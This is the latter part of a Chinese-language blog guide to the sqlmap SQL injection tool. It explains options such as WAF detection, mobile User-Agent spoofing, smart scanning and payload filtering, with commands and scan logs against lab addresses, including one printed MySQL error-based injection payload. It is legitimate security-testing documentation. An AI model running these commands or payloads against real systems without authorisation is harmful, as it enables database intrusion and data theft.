class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;KONA Security Solutions (Akamai Technologies)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Incapsula Web Application Firewall (Incapsula/Imperva)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;CloudFlare Web Application Firewall (CloudFlare)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Barracuda Web Application Firewall (Barracuda Networks)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;webApp.secure (webScurity)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Proventia Web Application Security (IBM)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] declared web<span class="hljs-built_in"> page </span>charset <span class="hljs-string">&#x27;iso-8859-1&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>]<span class="hljs-built_in"> page </span><span class="hljs-keyword">not</span> found (404)<br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;KS-WAF (Knownsec)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;NetScaler (Citrix Systems)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;Jiasule Web Application Firewall (Jiasule)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;WebKnight Application Firewall (AQTRONIX)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;AppWall (Radware)&#x27;</span><br>[xx:xx:23] [<span class="hljs-built_in">DEBUG</span>] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">&#x27;ModSecurity: Open Source Web Application Firewall (Trustwave)&#x27;</span><br>[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified <span class="hljs-string">&#x27;ModSecurity: Open Source Web Application Firewall (Trustwave)&#x27;</span>. Please consider usage of tamper scripts (option <span class="hljs-string">&#x27;--tamper&#x27;</span>)<br></code></pre></td></tr></table></figure>
<blockquote>
<p>参数：<code>--skip-waf</code></p>
</blockquote>
<p>默认地 Sqlmap 会发送虚假的 SQL 注入 playload 以试探目标是否有保护措施。如有任何问题，用户可以使用参数<code>--skip-waf</code>来禁用这一技术。</p>
<h4 id="模仿智能手机">模仿智能手机</h4>
<p>参数：<code>--mobile</code></p>
<p>有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的 User-Agent，或者更简单地，使用此参数，Sqlmap 会在执行时询问要模仿成流行的手机中的哪种，如：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp">$ python sqlmap.py -u <span class="hljs-string">&quot;http://www.target.com/vuln.php?id=1&quot;</span> --mobile<br>[...]<br>which smartphone <span class="hljs-keyword">do</span> you want sqlmap to imitate through HTTP User-Agent header?<br>[<span class="hljs-meta">1</span>] Apple iPhone <span class="hljs-number">4</span>s (<span class="hljs-literal">default</span>)<br>[<span class="hljs-meta">2</span>] BlackBerry <span class="hljs-number">9900</span><br>[<span class="hljs-meta">3</span>] Google Nexus <span class="hljs-number">7</span><br>[<span class="hljs-meta">4</span>] HP iPAQ <span class="hljs-number">6365</span><br>[<span class="hljs-meta">5</span>] HTC Sensation<br>[<span class="hljs-meta">6</span>] Nokia N97<br>[<span class="hljs-meta">7</span>] Samsung Galaxy S<br>&gt; <span class="hljs-number">1</span><br>[...]<br></code></pre></td></tr></table></figure>
<h4 id="离线模式仅仅使用会话数据">离线模式（仅仅使用会话数据）</h4>
<blockquote>
<p>参数：<code>--offline</code></p>
</blockquote>
<p>添加此参数，Sqlmap 将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。</p>
<h4 id="在-google-dork-中展示页面权重">在 Google dork 中展示页面权重</h4>
<blockquote>
<p>参数：<code>--page-rank</code></p>
</blockquote>
<p>与参数<code>-g</code>一起使用，这会使 Sqlmap 向 Google 发起更多的请求并展示页面权重。</p>
<h4 id="从输出目录中安全移除所有内容">从输出目录中安全移除所有内容</h4>
<blockquote>
<p>参数：<code>--purge-output</code></p>
</blockquote>
<p>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--purge-output</span> -v <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[*] starting at <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span><br><br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] cleaning up configuration parameters<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">INFO</span>] purging content of directory <span class="hljs-string">&#x27;/home/werner/.sqlmap/output&#x27;</span>...<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] changing file attributes<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] writing random data to files<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] truncating files<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] renaming filenames to random values<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] renaming directory names to random values<br>[<span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span>] [<span class="hljs-symbol">DEBUG</span>] deleting the whole directory tree<br><br>[*] shutting down at <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure>
<h4 id="快速扫描">快速扫描</h4>
<blockquote>
<p>参数：<code>--smart</code></p>
</blockquote>
<p>当有大量 URL 要进行测试（如：<code>-m</code>），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用<code>--smart</code>进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余 URL 均被跳过。如：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;</span> --batch --smart<br>[<span class="hljs-built_in">..</span>.]<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">if</span> <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;ca&#x27;</span> is dynamic<br>[xx:xx:14] [<span class="hljs-built_in">WARNING</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;ca&#x27;</span> does <span class="hljs-keyword">not</span> appear dynamic<br>[xx:xx:14] [<span class="hljs-built_in">WARNING</span>] heuristic (basic) test shows that <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;ca&#x27;</span> might <span class="hljs-keyword">not</span> be injectable<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] skipping <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;ca&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">if</span> <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;user&#x27;</span> is dynamic<br>[xx:xx:14] [<span class="hljs-built_in">WARNING</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;user&#x27;</span> does <span class="hljs-keyword">not</span> appear dynamic<br>[xx:xx:14] [<span class="hljs-built_in">WARNING</span>] heuristic (basic) test shows that <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;user&#x27;</span> might <span class="hljs-keyword">not</span> be injectable<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] skipping <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;user&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">if</span> <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is dynamic<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] confirming that <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is dynamic<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is dynamic<br>[xx:xx:14] [<span class="hljs-built_in">WARNING</span>] reflective value(s) found <span class="hljs-keyword">and</span> filtering out<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] heuristic (basic) test shows that <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> might be<br>injectable (possible DBMS: <span class="hljs-string">&#x27;MySQL&#x27;</span>)<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">for</span> SQL injection on <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> heuristic (parsing) test showed that the back-end DBMS could be <span class="hljs-string">&#x27;MySQL&#x27;</span>. <span class="hljs-keyword">Do</span> you want <span class="hljs-keyword">to</span> skip test payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] Y<br><span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;MySQL&#x27;</span> extending provided level (1) <span class="hljs-keyword">and</span> risk (1)? [Y/n] Y<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span> injectable<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is <span class="hljs-string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&#x27;</span> injectable<br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL inline queries&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.11 stacked queries&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span><br>[xx:xx:14] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.11 AND time-based blind&#x27;</span><br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is <span class="hljs-string">&#x27;MySQL &gt; 5.0.11 AND time-based blind&#x27;</span> injectable<br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other potential injection technique found<br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] ORDER BY technique seems <span class="hljs-keyword">to</span> be usable. This should reduce the<br>time needed <span class="hljs-keyword">to</span> <span class="hljs-built_in">find</span> the right number of query columns. Automatically extending the range <span class="hljs-keyword">for</span> current UNION query injection technique test<br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] target URL appears <span class="hljs-keyword">to</span> have 3 columns <span class="hljs-keyword">in</span> query<br>[xx:xx:24] [<span class="hljs-built_in">INFO</span>] <span class="hljs-built_in">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span> is <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable<br>[<span class="hljs-built_in">..</span>.]<br></code></pre></td></tr></table></figure>
<h4 id="通过关键词使用或跳过-payload">通过关键词使用或跳过 payload</h4>
<blockquote>
<p>参数：<code>--test-filter</code></p>
</blockquote>
<p>若只想使用包含关键词<code>ROW</code>的 payload 可使用参数<code>--test-filter=ROW</code>。下面是以 Mysql 为目标的例子：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--test-filter</span>=ROW<br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">[xx:xx:<span class="hljs-number">39</span>] [INFO] <span class="hljs-keyword">GET</span> <span class="hljs-keyword">parameter</span> ’id’ <span class="hljs-keyword">is</span> <span class="hljs-keyword">dynamic</span><br>[xx:xx:<span class="hljs-number">39</span>] [WARNING] reflective <span class="hljs-keyword">value</span>(s) found <span class="hljs-keyword">and</span> filtering <span class="hljs-keyword">out</span><br>[xx:xx:<span class="hljs-number">39</span>] [INFO] heuristic (basic) test shows that <span class="hljs-keyword">GET</span> <span class="hljs-keyword">parameter</span> ’id’ might be injectable (possible DBMS: ’MySQL’)<br>[xx:xx:<span class="hljs-number">39</span>] [INFO] testing <span class="hljs-keyword">for</span> <span class="hljs-keyword">SQL</span> injection <span class="hljs-keyword">on</span> <span class="hljs-keyword">GET</span> <span class="hljs-keyword">parameter</span> ’id’<br>[xx:xx:<span class="hljs-number">39</span>] [INFO] testing ’MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">4.1</span> <span class="hljs-keyword">AND</span> error<span class="hljs-operator">-</span>based <span class="hljs-operator">-</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">HAVING</span> clause’<br>[xx:xx:<span class="hljs-number">39</span>] [INFO] <span class="hljs-keyword">GET</span> <span class="hljs-keyword">parameter</span> ’id’ <span class="hljs-keyword">is</span> ’MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">4.1</span> <span class="hljs-keyword">AND</span> error<span class="hljs-operator">-</span>based <span class="hljs-operator">-</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">HAVING</span> clause’ injectable <span class="hljs-keyword">GET</span> <span class="hljs-keyword">parameter</span> ’id’ <span class="hljs-keyword">is</span> vulnerable. Do you want <span class="hljs-keyword">to</span> keep testing the others (if <span class="hljs-keyword">any</span>)? [y<span class="hljs-operator">/</span>N] N<br>sqlmap identified the following injection points <span class="hljs-keyword">with</span> a total <span class="hljs-keyword">of</span> <span class="hljs-number">3</span> HTTP(s) requests:<br><span class="hljs-comment">---</span><br>Place: <span class="hljs-keyword">GET</span><br><span class="hljs-keyword">Parameter</span>: id<br>    Type: error<span class="hljs-operator">-</span>based<br>    Title: MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">4.1</span> <span class="hljs-keyword">AND</span> error<span class="hljs-operator">-</span>based <span class="hljs-operator">-</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">HAVING</span> clause<br>    Payload: id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-type">ROW</span>(<span class="hljs-number">4959</span>,<span class="hljs-number">4971</span>)<span class="hljs-operator">&gt;</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(<span class="hljs-number">0x3a6d70623a</span>,(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">4959</span><span class="hljs-operator">=</span><span class="hljs-number">4959</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span> <span class="hljs-keyword">END</span>)),<span class="hljs-number">0x3a6b7a653a</span>,<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">4706</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">3536</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">7442</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">3470</span>)a <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)<br><span class="hljs-comment">---</span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>参数：<code>--test-skip</code></p>
</blockquote>
<p>若不想使用包含关键词<code>BENCHMARK</code>的 payload 可使用参数<code>--test-skip=BENCHMARK</code>。</p>
<h4 id="交互式-sqlmap-shell">交互式 Sqlmap Shell</h4>
<blockquote>
<p>参数：<code>--sqlmap-shell</code></p>
</blockquote>
<p>使用此参数可以打开一个交互式的 Sqlmap Shell，支持历史记录。如：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">werner<span class="hljs-meta">@Yasser:~$</span> sqlmap --sqlmap-shell<br>        ___<br>       __H__<br> ___ ___[.]_____ ___ ___  &#123;1.1.10<span class="hljs-comment">#stable&#125;</span><br>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<br>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [(]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<br>      |<span class="hljs-string">_</span>|<span class="hljs-string">V          </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">sqlmap-shell&gt; -u &quot;192.168.56.102&quot;</span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting at 20:22:46</span><br><span class="hljs-string"></span><br><span class="hljs-string">[20:22:46] [INFO] testing connection to the target URL</span><br><span class="hljs-string">[20:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="hljs-string">[20:22:46] [INFO] testing if the target URL is stable</span><br><span class="hljs-string">[20:22:47] [INFO] target URL is stable</span><br><span class="hljs-string">[20:22:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter &#x27;id&#x27; in &#x27;www.site.com/index.php?id=1&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] shutting down at 20:22:47</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ___</span><br><span class="hljs-string">       __H__</span><br><span class="hljs-string"> ___ ___[.]_____ ___ ___  &#123;1.1.10#stable&#125;</span><br><span class="hljs-string"></span>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<br>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [(]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<br>      |<span class="hljs-string">_</span>|<span class="hljs-string">V          </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">sqlmap-shell&gt; exit</span><br></code></pre></td></tr></table></figure>
<h1 id="个人使用经验">个人使用经验</h1>
<ol type="1">
<li>sqlmap 一般使用 <code>and</code> 做连接符, 因为 <code>or</code> 比较危险(比如注入点在 insert 或者 update 或者 delete), 这也是为啥有 <code>--risk</code> 参数的原因.</li>
<li>sqlmap 的参数 <code>--regexp</code> 用于区分不同的页面, 使用前提是 url 需要为正常页面, 而且盲注正则表达式. 其他的类似参数如 <code>--string</code> 等同理</li>
</ol>
<h1 id="结语">结语</h1>
<p>SQLmap 太强大了。据说它不仅的注入本领是一流的，代码也是一流的。有时间我会读一遍它的源码，学习一下一个大型的好工具应该如何去写。</p>
<br>
<p style="text-align: center;">
<font size="2px" color="gray">来呀快活呀</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%B7%A5%E5%85%B7/">#工具</a>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/%E6%B3%A8%E5%85%A5/">#注入</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SQLmap 使用手册</div>
      <div>https://www.tr0y.wang/2018/03/21/sqlmap-guide/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2018年3月21日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2023年12月13日</div>
        </div>
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2018/04/06/WebGoat/" title="WebGoat 靶场题解">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">WebGoat 靶场题解</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2018/01/28/WlanSniffer/" title="WLANSniffer">
                        <span class="hidden-mobile">WLANSniffer</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

